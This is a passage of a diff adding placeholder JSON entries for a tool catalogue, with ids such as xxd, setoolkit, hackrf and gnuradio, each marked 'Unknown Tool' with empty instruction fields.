+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "xxd",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "hexedit",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "dradis",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "faraday",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "setoolkit",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "hackrf",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "gqrx",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "gnuradio",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "urh",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  }
+]
